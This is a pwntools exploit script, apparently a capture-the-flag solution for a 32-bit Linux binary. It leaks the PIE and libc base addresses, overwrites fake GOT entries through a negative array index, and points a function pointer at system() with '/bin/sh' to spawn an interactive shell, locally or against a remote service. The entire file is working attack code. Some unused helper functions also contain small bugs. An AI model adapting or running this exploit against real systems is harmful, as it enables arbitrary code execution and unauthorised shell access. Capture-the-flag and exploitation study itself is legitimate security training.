#! /usr/bin/python
from pwn import *

context.update(
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = ""
PORT = 1234

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)

def exploit(io,e,l):
    io.recvuntil(b"information: ")
    pie = int(io.recvline(), 16) - e.sym["main"]

    fake_got1 = flat(
        # 0xf900c0
        p32(pie + e.sym["main"] + 0x1f6ac - 0x118c), p32(0), p32(0), p32(0), # GOT[puts] - main = 0x1f6ac (offset for "Thanks" string)
        
        # 0xf900d0
        p32(0), p32(0), p32(0), p32(0),
        
        # 0xf900e0
        p32(0), p32(pie + e.sym["main"]), p32(0), p32(0), # address for main() so exit() jumps back into main()
        
        # 0xf900f0
        p32(0), p32(0), p32(0), p32(0),

        # 0xf90100
        p32(0), p32(0), p32(0), p32(pie + e.sym["main"] - 0x80), # offset from main() to puts_blue()

    )

    print(f"[*] PIE BASE: 0x{pie:x}")

    io.sendlineafter(b"game?", fake_got1)

    level_idx = -12
    io.sendlineafter(b"change?", f"{level_idx}".encode())

    # last two bytes of global pointer, offset by 0x90 to point to game_name
    value = 0x8000 + 0x90
    io.sendlineafter(b"level?", f"{value}".encode())

    io.recvuntil(b'in your game')
    io.recvline()
    libcoff = int.from_bytes(io.recvline()[5:9], 'little') - l.sym["puts"]
    print(f"[*] libc @ 0x{libcoff:x}")

    fake_got2 = flat(
        # 0xf900c0
        p32(next(l.search(b'/bin/sh\0')) - 0x118c + libcoff), p32(0), p32(0), p32(0), # "/bin/sh"
        
        # 0xf900d0
        p32(0), p32(0), p32(0), p32(0),
        
        # 0xf900e0
        p32(0), p32(pie + e.sym["main"]), p32(0), p32(0), # address for main() so exit() jumps back into main()
        
        # 0xf900f0
        p32(0), p32(0), p32(0), p32(0),

        # 0xf90100
        p32(0), p32(0), p32(0), p32(l.sym['system'] + libcoff), # system()
    )

    io.sendlineafter(b"game?", fake_got2)

    level_idx = -12
    io.sendlineafter(b"change?", f"{level_idx}".encode())

    # last two bytes of global pointer, offset by 0x90 to point to game_name
    value = 0x8000 + 0x90
    io.sendlineafter(b"level?", f"{value}".encode())

    io.interactive()
    
if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./lib/libc.so")

    exploit(p,e,l)

